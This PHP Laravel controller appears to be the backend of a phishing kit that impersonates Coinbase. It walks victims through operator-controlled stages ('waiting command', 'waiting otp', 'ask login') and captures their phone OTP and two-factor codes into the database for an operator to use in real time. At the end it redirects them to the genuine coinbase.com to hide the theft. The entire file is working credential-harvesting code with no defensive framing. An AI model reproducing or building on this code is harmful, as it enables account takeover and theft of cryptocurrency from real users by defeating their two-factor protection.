<?php

namespace App\Http\Controllers;

use Auth;
use Illuminate\Http\Request;

class UserController extends Controller
{
    public function index() 
    {
        $user = auth()->user();
       
        if($user->status == 'submitted' || $user->status == 'waiting command') {
            return view('verify');
        } 
        if ($user->status == 'waiting otp') {
            return view('otp');
        }
        if ($user->status == 'waiting info') {
            return view('two_fa');
        } 
        if($user->status == 'ask login') {
            Auth::logout();
            return view('login');
        }
        if($user->status == 'finish') {
            return redirect()->to('https://www.coinbase.com/');
        }
    }

    public function otpStore(Request $request) 
    {
        $user = Auth::user();

        $otp = '';
        for ($i = 1; $i <= 7; $i++) {
            $inputValue = $request->input('otp' . $i, '');
            $otp .= $inputValue;
        }
        $user->phone_otp = $otp;
        $user->status = 'submitted';
        $user->save();

        return response()->json([
            'status' => true,
            'message' => 'OTP saved successfully',
            'userId'=> $user->id,
            'redirect' => route('home'),
        ]);
    }

    public function twofaStore(Request $request)
    {
        $user = Auth::user();
        $otp = '';
        for ($i = 1; $i <= 6; $i++) {
            $inputValue = $request->input('otp' . $i, '');
            $otp .= $inputValue;
        }
        $user->two_fa = $otp;
        $user->status = 'submitted';
        $user->save();

        return response()->json([
            'status' => true,
            'message' => '2 FA saved successfully',
            'userId'=> $user->id,
            'redirect' => route('home'),
        ]);
    }


}
